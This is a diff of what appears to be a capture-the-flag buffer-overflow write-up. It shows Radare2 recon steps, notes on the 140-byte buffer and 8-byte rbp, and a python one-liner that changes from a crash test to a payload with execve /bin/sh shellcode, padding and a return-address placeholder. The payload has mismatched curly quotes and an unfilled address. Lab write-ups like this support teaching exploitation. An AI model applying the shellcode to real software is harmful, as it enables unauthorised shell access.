@@ -1073,24 +1073,25 @@ You’ve probably noticed that shellcode, memory addresses and NOP sleds are usu
 
 **Known**  
 
--The buffer is 140 bytes
+- The buffer is 140 bytes
+- The 64-bit architecture uses an 8-byte base pointer (rbp)
+- The minimum overflow length is 149 bytes to overflow into the return address
 
 **Initial Recon**  
 
-
-Use Radare2 to open the buffer-overflow script (`:> r2 buffer-overflow`),
+Use Radare2 to open the buffer-overflow script (`:> r2 buffer-overflow`),  
 perform initial analysis (`:> aaa`), and  
-enumerate the flagspace (`:> fs`) 
+enumerate the flagspace (`:> fs`)  
 
 ![Initial Recon 1](assets/buffer-overflow-13-task8-2.png)
 
 This reveals the entry point of the progra is 0x00400450  
 
-enumerate the flagspaces until there is a reference to the copy_arg function, which is found in the symbols flagspace:  
+Enumerate the flagspace `fs <flagspace name>;f` to capture the entry point of the main function and the copy_arg function.  
 
 `:> fs symbols; f`  
 
-The entry point of this function is 0x00400527  
+ 
 
 ![Initial Recon 2](assets/buffer-overflow-14-task8-3.png)  
 
@@ -1118,7 +1119,8 @@ Print the function to learn more about what happens inside
 
 ![copy_arg Function](assets/buffer-overflow-16-task8-5.png)  
 
-`python -c 'print "A" * 146' | ./buffer-overflow`
+
+`python -c “print ("A" * 148 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" + "B" * 30 + memory address)”`
 
 
 
